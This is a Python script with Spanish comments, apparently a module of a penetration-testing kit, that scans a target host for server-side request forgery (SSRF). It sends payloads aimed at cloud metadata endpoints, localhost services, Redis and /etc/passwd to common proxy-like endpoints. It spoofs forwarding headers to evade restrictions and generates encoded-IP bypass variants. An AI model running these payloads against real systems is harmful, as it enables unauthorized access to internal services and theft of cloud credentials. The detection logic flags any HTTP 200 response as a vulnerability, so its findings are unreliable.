import requests
import re
from urllib.parse import quote

def execute(target):
    print(f"\n[INFO] Iniciando prueba avanzada de SSRF en: {target}")

    # Endpoints comunes y rutas sospechosas
    endpoints = [
        "/api/proxy", "/admin/test", "/fetch", "/debug", "/api/url",
        "/internal/redirect", "/data/fetch"
    ]

    # Payloads avanzados con diversas técnicas de ataque
    payloads = [
        "http://169.254.169.254/latest/meta-data/",  # AWS Metadata
        "http://127.0.0.1:22",  # Localhost SSH
        "http://127.0.0.1:80",  # Localhost HTTP
        "http://internal-service:8080",  # Servicio interno genérico
        "file:///etc/passwd",  # Acceso a archivos locales
        "http://[::1]:80",  # IPv6 Localhost
        "http://0.0.0.0:8000",  # Wildcard IP
        "http://localhost:6379",  # Redis sin autenticar
    ]

    # Indicadores clave para detectar SSRF
    vulnerability_indicators = [
        "meta-data", "root:", "localhost", "127.0.0.1", "internal-service",
        "ssh-rsa", "404 Not Found", "HTTP/1.1 200 OK"
    ]

    # Cabeceras avanzadas para evadir restricciones
    headers = {
        "User-Agent": "Mozilla/5.0 (VulnKit-SSRF Advanced)",
        "Accept": "*/*",
        "X-Forwarded-For": "127.0.0.1",  # Evasión básica
        "Forwarded": "for=127.0.0.1; proto=http; host=internal"
    }

    vulnerable_endpoints = []
    for endpoint in endpoints:
        for payload in payloads:
            url = f"http://{target}{endpoint}?url={quote(payload)}"
            try:
                response = requests.get(url, headers=headers, timeout=10)
                if is_vulnerable(response, payload):
                    vulnerable_endpoints.append({
                        "url": url,
                        "payload": payload,
                        "response_preview": response.text[:500]  # Vista previa limitada
                    })
            except requests.Timeout:
                print(f"[ERROR] Tiempo de espera agotado para {url}")
            except requests.ConnectionError:
                print(f"[ERROR] No se pudo conectar con {url}")
            except Exception as e:
                print(f"[ERROR] Error inesperado en {url}: {e}")

    if vulnerable_endpoints:
        print("\n[RESULTADOS] Vulnerabilidades detectadas:")
        for vuln in vulnerable_endpoints:
            print(f" - Endpoint: {vuln['url']}")
            print(f"   Payload: {vuln['payload']}")
            print(f"   Respuesta: {vuln['response_preview']}")
        return "Vulnerable a SSRF"
    else:
        print("\n[INFO] No se detectaron vulnerabilidades en los endpoints probados.")
        return "No vulnerable"

def is_vulnerable(response, payload):
    """
    Analiza la respuesta en busca de indicadores clave.
    """
    indicators = [
        "meta-data", "root:", "localhost", "127.0.0.1", "internal-service",
        "ssh-rsa", "HTTP/1.1 200 OK"
    ]
    if response.status_code == 200 or any(indicator in response.text.lower() for indicator in indicators):
        print(f"[ALERTA] SSRF detectado con payload: {payload}")
        return True
    return False

def apply_bypass_techniques(payload):
    """
    Genera variantes de payload para evadir restricciones.
    """
    techniques = [
        lambda p: p.replace("http://", "http://127.0.0.1@"),  # Prefijo de usuario
        lambda p: p.replace("127.0.0.1", "2130706433"),  # Decimal IP
        lambda p: p.replace("localhost", "0x7f000001"),  # Hexadecimal IP
        lambda p: p.replace(":", "%3A"),  # Encoding de puerto
        lambda p: p.replace("http://", "http://[::1]/")  # IPv6 Prefijo
    ]
    return [tech(payload) for tech in techniques]

def log_results(results, filename="ssrf_results.log"):
    """
    Registra los resultados de las pruebas en un archivo.
    """
    with open(filename, "w") as log_file:
        for result in results:
            log_file.write(f"URL: {result['url']}\n")
            log_file.write(f"Payload: {result['payload']}\n")
            log_file.write(f"Preview:\n{result['response_preview']}\n\n")
    print(f"[INFO] Resultados guardados en {filename}")
